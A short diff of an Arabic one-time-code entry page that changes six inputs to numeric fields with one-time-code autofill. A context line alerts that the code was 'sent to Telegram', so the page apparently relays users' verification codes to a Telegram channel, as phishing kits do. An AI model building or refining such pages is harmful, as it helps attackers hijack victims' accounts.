@@ -169,14 +169,14 @@ font-size: 18px;
 <h2>تم ارسال رمز التأكيد</h2>
 <p>ادخل رمز التأكيد المكون من 6 خانات والذي تم إرساله إلى هاتفك للتحقق من حسابك</p>
 
-<div class="code-inputs">
-<input type="text" maxlength="1">
-<input type="text" maxlength="1">
-<input type="text" maxlength="1">
-<input type="text" maxlength="1">
-<input type="text" maxlength="1">
-<input type="text" maxlength="1">
-</div>
+    <div class="code-inputs">
+      <input type="tel" inputmode="numeric" pattern="[0-9]*" maxlength="1" autocomplete="one-time-code">
+      <input type="tel" inputmode="numeric" pattern="[0-9]*" maxlength="1" autocomplete="one-time-code">
+      <input type="tel" inputmode="numeric" pattern="[0-9]*" maxlength="1" autocomplete="one-time-code">
+      <input type="tel" inputmode="numeric" pattern="[0-9]*" maxlength="1" autocomplete="one-time-code">
+      <input type="tel" inputmode="numeric" pattern="[0-9]*" maxlength="1" autocomplete="one-time-code">
+      <input type="tel" inputmode="numeric" pattern="[0-9]*" maxlength="1" autocomplete="one-time-code">
+    </div>
 
 <div class="resend-container">
 <div class="circle">
@@ -286,4 +286,5 @@ alert("🚀 تم إرسال رمز التأكيد إلى تلجرام");
 });
 </script>
 </body>
+
 </html>
